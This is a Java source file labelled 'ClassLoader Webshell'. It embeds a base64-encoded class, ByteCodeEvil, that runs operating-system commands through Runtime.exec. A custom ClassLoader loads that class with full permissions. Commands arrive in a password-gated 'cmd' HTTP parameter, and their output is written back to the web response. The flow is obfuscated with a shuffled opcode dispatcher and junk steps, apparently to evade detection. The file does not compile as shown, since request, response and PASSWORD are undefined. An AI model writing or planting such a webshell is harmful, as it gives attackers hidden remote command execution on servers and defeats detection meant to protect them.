package org.sec.util;

/**
 * ClassLoader Webshell
 */
public class CL {
    public static void main(String[] args) {
        final String[] globalArr = new String[]{
                "0|1|2|3|4|5|6|7|8|9|10|11|12|13|14",
                "yv66vgAAADQAcQoAGwAvBwAwCgACAC8HADEHADIKADMANAoAMwA1CgA2ADcKAAUAOAoABAA5CgAEADoKAAIAOwgAPAoAAgA9CQAQAD4HAD8KAEAAQQgAQgoAQwBECgBFAEYKAEUARwcASAoAFgAvCgAWAEkJAEoASwoATABNBwBOAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAD8HAE8HADAHADEBAApFeGNlcHRpb25zBwBQAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAeAFEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBSDABTAFQMAFUAVgcAVwwAWABZDAAeAFoMAB4AWwwAXAAqDABdAF4BAAEKDAApACoMABwAHQEAGm9yZy9zZWMvc3RhcnQvQnl0ZUNvZGVFdmlsBwBfDABgAGEBABJCeXRlQ29kZUV2aWwuY2xhc3MHAGIMAGMAZAcAZQwAZgBnDABoAGkBABZzdW4vbWlzYy9CQVNFNjRFbmNvZGVyDABqAGsHAGwMAG0AbgcAbwwAcAAfAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD2phdmEvbGFuZy9DbGFzcwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAE2dldFJlc291cmNlQXNTdHJlYW0BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAAMoKUkBAARyZWFkAQAFKFtCKUkBAAxlbmNvZGVCdWZmZXIBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAEAAbAAAAAQAAABwAHQAAAAMAAQAeAB8AAgAgAAAAnAAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAACACEAAAAiAAgAAAAMAAQADQAMAA4AFAAPACUAEQAvABIAPgAUAEYAFQAiAAAAGwAC/wAlAAQHACMHACQHACUHACYAAPwAGAcAJAAnAAAABAABACgAAQApACoAAQAgAAAAHQABAAEAAAAFKrQAD7AAAAABACEAAAAGAAEAAAAYAAkAKwAsAAIAIAAAAGAAAgAFAAAAMBIQtgAREhK2ABNMK7YAFLwITSsstgAVV7sAFlm3ABdOLSy2ABg6BLIAGRkEtgAasQAAAAEAIQAAAB4ABwAAABwACwAdABIAHgAYAB8AIAAgACcAIQAvACIAJwAAAAQAAQAoAAEALQAAAAIALg==",
                "org/sec/ByteCodeEvil",
                "pwd",
                "cmd",
                "<pre>",
                "</pre>",
                "ByteCodeEvil"
        };

        String temp = globalArr[0];
        String[] b = temp.split("\\|");

        String cmd = null;
        String pwd = null;
        ClassLoader loader = null;
        Class<?> clazz = null;
        java.lang.reflect.Constructor<?> constructor = null;
        String result = null;

        int index = 0;
        while (true) {
            int op = Integer.parseInt(b[index++]);
            switch (op) {
                case 0:
                    cmd = request.getParameter(globalArr[4]);
                    break;
                case 1:
                    pwd = request.getParameter(globalArr[3]);
                    break;
                case 2:
                    if (!pwd.equals(PASSWORD)) {
                        return;
                    }
                    break;
                case 3:
                    for (int i = 0; i < 10; i++) {
                        new Object();
                    }
                    break;
                case 4:
                    loader = new ClassLoader() {
                        @Override
                        public Class<?> loadClass(String QwEr) throws ClassNotFoundException {
                            if (QwEr.contains(globalArr[7])) {
                                return findClass(QwEr);
                            }
                            return super.loadClass(QwEr);
                        }

                        @Override
                        protected Class<?> findClass(String PoIu) throws ClassNotFoundException {
                            try {
                                byte[] innerBytes = new sun.misc.BASE64Decoder().decodeBuffer(globalArr[1]);
                                java.security.PermissionCollection pc = new java.security.Permissions();
                                pc.add(new java.security.AllPermission());
                                java.security.ProtectionDomain protectionDomain = new java.security.ProtectionDomain(
                                        new java.security.CodeSource(null, (java.security.cert.Certificate[]) null),
                                        pc, this, null);
                                return this.defineClass(PoIu, innerBytes, 0, innerBytes.length, protectionDomain);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            return super.findClass(PoIu);
                        }
                    };
                    break;
                case 5:
                    clazz = loader.loadClass(globalArr[2]);
                    break;
                case 6:
                    constructor = clazz.getConstructor(String.class);
                    break;
                case 7:
                    result = constructor.newInstance(cmd).toString();
                    break;
                case 8:
                    response.getWriter().print(globalArr[5]);
                    break;
                case 9:
                    response.getWriter().print(result.toString());
                    break;
                case 10:
                    response.getWriter().print(globalArr[6]);
                    break;
            }
        }
    }
}
